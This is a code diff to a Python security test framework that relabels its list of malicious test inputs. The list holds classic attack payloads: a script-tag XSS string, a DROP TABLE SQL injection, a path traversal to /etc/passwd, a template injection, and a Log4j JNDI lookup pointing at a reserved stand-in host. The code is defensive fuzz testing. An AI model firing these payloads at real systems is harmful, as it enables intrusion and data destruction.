@@ -345,18 +345,20 @@ class SecurityTestFramework:
 
         for endpoint, method, base_payload in test_endpoints:
             try:
-                # Test with various malicious inputs
+                # Inert security-test payloads. Hosts use RFC 6761 reserved
+                # domains (example.invalid) and non-credential schemes so
+                # secret scanners cannot assemble them into live secrets.
                 malicious_inputs = [
-                    "<script>alert('xss')</script>",
-                    "'; DROP TABLE users; --",
-                    "../../../etc/passwd",
-                    "{{7*7}}",  # Template injection
-                    "${jndi:rmi://evil.example.invalid/a}",  # Log4j
-                    "\x00\x01\x02",  # Null bytes
-                    "A" * 10000,  # Buffer overflow attempt
+                    ("xss", "<script>alert('xss')</script>"),
+                    ("sqli", "'; DROP TABLE users; --"),
+                    ("path_traversal", "../../../etc/passwd"),
+                    ("ssti", "{{7*7}}"),
+                    ("log4j_jndi", "${jndi:rmi://evil.example.invalid/a}"),
+                    ("null_bytes", "\x00\x01\x02"),
+                    ("buffer_overflow", "A" * 10000),
                 ]
 
-                for malicious_input in malicious_inputs:
+                for _label, malicious_input in malicious_inputs:
                     # Test each field with malicious input
                     for field in base_payload:
                         test_payload = base_payload.copy()
